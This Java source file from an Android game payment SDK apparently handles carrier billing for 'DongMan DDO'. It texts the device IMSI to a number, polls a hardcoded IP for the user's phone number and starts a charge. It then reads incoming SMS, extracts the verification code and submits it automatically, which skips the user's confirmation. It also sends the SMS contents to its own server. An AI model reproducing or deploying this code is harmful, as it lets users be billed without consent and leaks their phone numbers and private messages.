package mobi.zty.pay.sdk.dongmanDDO;

import java.io.IOException;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

/**
 * 动漫DDO支付管理类
 * 
 * @author Administrator
 * 
 */
public class DongManDDOInstance extends PaymentInterf {
	private static DongManDDOInstance instance;
	private Handler callBHandler = null;
	private String phone;
	private String obtain_num = "106905114048";
	private String url2 = "";
	private String channelId = "";
	private String exdata = "";
	public  final String num_url = "http://211.154.152.59:8080/sdk/mobileNum?";//获取手机号码的url
	private String vertifyNum = "";
	public static DongManDDOInstance getInstance() {
		if (instance == null) {
			instance = scyMMpay();
		}
		return instance;
	}

	private static synchronized DongManDDOInstance scyMMpay() {
		if (instance == null) {
			instance = new DongManDDOInstance();
		}
		return instance;
	}

	@Override
	public void init(Context context, Object... parameters) {
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		exdata = (String) parameters[0];
		final int feeIndex = (Integer) parameters[1];
		Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "进入支付：", feeIndex);
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		final String url1 = mkInfo.payUrl1;
		url2 = mkInfo.payUrl2;
		channelId = mkInfo.spChannel;
		final String appName = mkInfo.appName;
		final int fee = feeInfo.consume;
		final String imsi = Helper.getIMSI(context);
		phone = isEmpty(phone)?mkInfo.sendNum:phone;
		obtain_num = mkInfo.confimNum;
		vertifyNum = mkInfo.vertifyNum;
		Util_G.debugE("dongma_pay2", "phoneNum->" +phone);
		Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "参数赋值完毕", feeIndex);
		if (phone == null || phone.trim().equals("")) {
			Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "去获取手机号码：obtain_num="+obtain_num+" imsi="+imsi, feeIndex);
			Util_G.sendTextMessage(context, obtain_num, imsi, null, 0);// 发这条短信给平台  是为了获取手机号码
			httpGetPhonNum(num_url, imsi, new Callback() {// 轮询我们自己服务端获取手机号码，

						@Override
						public void onResult(String info) {
							boolean SUCC =  false;
							if (info != null && !info.trim().equals("")) {
								try {
									JSONObject resut = new JSONObject(info);
									String num = resut.getString("mobile_num");
									if (num != null && !num.equals("")) {
										phone = num;
										Util_G.debugE("dongma_pay1", "phoneNum->" +phone);
										sendPayHttp(url1, phone,appName,
												fee, channelId,exdata, feeIndex);
										Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "获取手机号码成功："+phone, feeIndex);
										SUCC = true;
									}
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
							if (!SUCC) {
								PayResultInfo info1 = new PayResultInfo();
								info1.resutCode = PayConfig.NO_PHONE_NUMBEL;
								info1.retMsg = "支付失败";
								Message message = callBHandler
										.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
								message.obj = info1;
								message.sendToTarget();
								Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "获取手机号失败", feeIndex);
							}
						}
					});
			
		} else {
			sendPayHttp(url1, phone, appName,fee, channelId,exdata, feeIndex);
		}
	}

	private boolean isEmpty(String str){
		if (str == null || str.trim().equals("")) {
			return true;
		}
		return false;
	}
	public  interface Callback {
		public void onResult(String info);
	}
	/**
	 * @param url
	 * @param imsi
	 * @return
	 */
	private void httpGetPhonNum(CharSequence url, String imsi,final Callback cb) {
		final String urlstr = url+ "imsi=" + imsi;
		new Thread() {
			@Override
			public void run() {
				String result = null;
				HttpGet httpGet = new HttpGet(urlstr);
				BasicHttpParams httpParams = new BasicHttpParams();
				HttpConnectionParams.setConnectionTimeout(httpParams,
						10 * 60 * 1000);
				HttpConnectionParams.setSoTimeout(httpParams, 10 * 60 * 1000);
				int step = 0;
				String mobile_num ="";
				while (mobile_num.equals("")&&step<20){
					try {
						Log.e("E支付的URL", urlstr);
						HttpClient client = new DefaultHttpClient(httpParams);
						HttpResponse httpResp = client.execute(httpGet);
						if (httpResp.getStatusLine().getStatusCode() == 200) {
							result = EntityUtils.toString(httpResp.getEntity(),
									"UTF-8");
							if(!(result.contains("DOCTYPE HTML")||result.contains("doctype html"))){
								
								try {
									JSONObject resutJs = new JSONObject(result);
									mobile_num = resutJs.getString("mobile_num");
								} catch (Exception e) {
									// TODO Auto-generated catch block
									e.printStackTrace();
								}
							}
						} 
						Log.e("httpResp", httpResp.getStatusLine()
								.getStatusCode() + "");

					} catch (ConnectTimeoutException e) {
						result = e.getMessage();

					} catch (ClientProtocolException e) {
						e.printStackTrace();
						result = e.getMessage();
					} catch (IOException e) {
						e.printStackTrace();
						result = e.getMessage();
					}
					try {
						Thread.sleep(1000);
						step++;
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
				}
				cb.onResult(result);
			}
		}.start();
	}
	
	private void sendPayHttp(final String url1, final String phone,final String appName,
			 final int fee,final String channelId,
			final String exdata, final int feeIndex) {
		Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "有手机号码后执行支付", feeIndex);
		new Thread(new Runnable() {
			@Override
			public void run() {
				PayResultInfo info = new PayResultInfo();
				info.index = feeIndex;
				try {
					String url = null;
					//http://218.66.104.164:9233/dm/vcodeHandle?channelId=xxx&phone=xxx&appName=xx&fee=XX&requestId=xxx
					Util_G.debugE("detail-->>", "channelId:"+channelId+"phone:"+phone+"fee:"+fee+"appname:"+appName+
							"order:"+exdata);
					url = url1 + "?channelId=" + channelId + "&phone=" + phone
							+ "&appName=" + appName + "&fee=" + fee
							+ "&requestId=" + exdata ;
					Util_G.debugE("DongManDDOInstance--url1:", url);
					Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "执行支付："+url, feeIndex);
					String requestResponse = HttpRequestt.get(url).body();
					boolean isSendMsg = false;
					if (requestResponse != null && requestResponse != "") {
						JSONObject retJson = new JSONObject(requestResponse);
						int state = getJsonInt(retJson, "code");
						Util_G.debugE("dongmaDDO_pay", requestResponse);
						if (state == 0) {// 订单获取成功
							GameSDK.getInstance().getCurgGroupFeeInfo().getIntdexVerifyMap().put(feeIndex, 1);
							isSendMsg = true;
							Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "第一次请求响应成功！接下来读取验证码！", feeIndex);
						}
					}
					if (!isSendMsg) {
						info.resutCode = PayConfig.SP_PAY_FAIL;
						info.retMsg = "支付失败";
						Message message = callBHandler
								.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
						Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "第一次请求响应失败！", feeIndex);
						return;
					}

				} catch (Exception e) {
					info.resutCode = PayConfig.SP_PAY_EXPTION;
					info.retMsg = "支付失败";
					Message message = callBHandler
							.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					e.printStackTrace();
					Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "支付异常："+e.getMessage(), feeIndex);
				}
			}
		}).start();
	}

	public  int getJsonInt(JSONObject json, String key) {
		int result = 0;
		try {
			result = json.getInt(key);
		} catch (Exception e) {
		}
		return result;
	}
	
	public String getJsonString(JSONObject json, String key) {
		String result = null;
		try {
			result = json.getString(key);
		} catch (Exception e) {
			e.printStackTrace();
		}
		return result;
	}
	
	public void notifyPay(Object... parameters) {
		final int feeIndex = (Integer) parameters[0];
		final String virifyCode = (String) parameters[1];
		new Thread(new Runnable() {
			@Override
			public void run() {
				// http://218.66.104.164:9233/dm/vcodeSubmit?channelId=xxx&phone=xxx&code=XX&requestId=xxx
				String url =  url2+ "?channelId=" + channelId + "&phone="
						+ phone +"&code=" + virifyCode + "&requestId="+ exdata;
				Util_G.debugE("notifyPay--url2:", url);
				String requestResponse = HttpRequestt.get(url).body();
				PayResultInfo info = new PayResultInfo();
				info.index = feeIndex;
				boolean isSCC = false;
				if (requestResponse != null && requestResponse != "") {
					Util_G.debugE("DDO_pay", "requestResponse->"
							+ requestResponse);
					Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "提交验证码的响应"+requestResponse, feeIndex);
					JSONObject retJson;
					try {
						retJson = new JSONObject(requestResponse);
						int state = getJsonInt(retJson, "code");
						if (state == 0) {
							isSCC = true;
						}
					} catch (JSONException e) {
						e.printStackTrace();
					}
				}else{
					Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "提交验证码的响应为空！", feeIndex);
				}
				if (isSCC) {
					info.resutCode = PayConfig.BIIL_SUCC;
					info.retMsg = "支付成功！";
				} else {
					info.resutCode = PayConfig.SP_PAY_FAIL;
					info.retMsg = "支付失败";
				}
				Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, info.retMsg, feeIndex);
				Message message = callBHandler
						.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
				message.obj = info;
				message.sendToTarget();
			}
		}).start();
		super.notifyPay(parameters);
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		int feeIndex = (Integer) parameters[2];
		Util_G.debugE("ALLPAY", "vertifyNum——》》" + vertifyNum
				+ "  content==>" + content);
		Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "读取到短信"+content, feeIndex);
		if (sendFrom.contains(vertifyNum)) {
			Util_G.debugE("ALLPAY", "vertifyNum——》》开始读取验证码");
			int startIndex = -1;
			int endIndex = 1;
			String munber = "0123456789";
			for (int i = 0; i < content.length(); i++) {
				String cr = content.charAt(i) + "";
				if (startIndex < 0 && munber.contains(cr)) {
					startIndex = i;
				} else if (startIndex >= 0
						&& !munber.contains(cr)) {
					endIndex = i;
					if (endIndex - startIndex < 6) {
						startIndex = -1;
						continue;
					} else {
						break;
					}
				}
			}
			String  vetif_vode = content.substring(startIndex,
					endIndex);
			
			if (vetif_vode!=null&&vetif_vode.length()>0) {
				Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "读取到验证码："+vetif_vode, feeIndex);
				notifyPay(feeIndex,vetif_vode);
			}else{
				Helper.sendPayMessageToServer(PayConfig.DONGMANDDO_PAY, "读取验证码失败：startIndex="+startIndex+
						" endIndex="+endIndex, feeIndex);
			}
		}
		super.sendVerifyCode(parameters);
	}
}
